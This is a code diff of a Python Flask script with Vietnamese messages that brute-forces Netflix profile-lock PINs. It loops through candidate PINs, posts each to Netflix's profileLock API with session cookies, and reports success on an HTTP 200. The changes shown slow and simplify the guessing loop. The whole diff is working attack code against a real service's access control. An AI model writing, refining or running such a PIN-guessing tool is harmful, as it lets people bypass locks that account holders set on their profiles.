@@ -63,12 +63,7 @@ def script_chay_ngam():
                 'guid': "VKV2YMB5SVBJ7NGNQQNHGDPJIY",
                 'pin': s
             }
-            for i in range(0,11,1):
-                if i == 10:
-                    print(f"Đang check mã pin : {s} (1.0)\r", end = "")
-                else :
-                    print(f"Đang check mã pin : {s} (0.{i})\r", end = "")
-                sleep(0.1)
+            sleep(1)
             response = requests.post(
                 'https://www.netflix.com/nq/website/memberapi/release/profileLock',
                 cookies=cookies,
@@ -76,13 +71,11 @@ def script_chay_ngam():
                 json=json_data,
             )
             check = response.status_code
-            
-            print("                                \r", end = "")
             if(check == 200):
                 return f"<h1 style='text-align: center; margin-top: 20%; font-family: Arial; color: green'>{check}</h1>"
                 break;
             else:
-                print(f"\033[31mPin {s} sai:))\033[0m")
+                print(f"\033[31mPin {s} sai:))\033[0m", flush=True)
                 
         except Exception as e:
             print(f"Lỗi {e}")
@@ -100,6 +93,7 @@ def home():
 
 if __name__ == "__main__":
     app.run(host='0.0.0.0', port=10000)
+
 
 
 
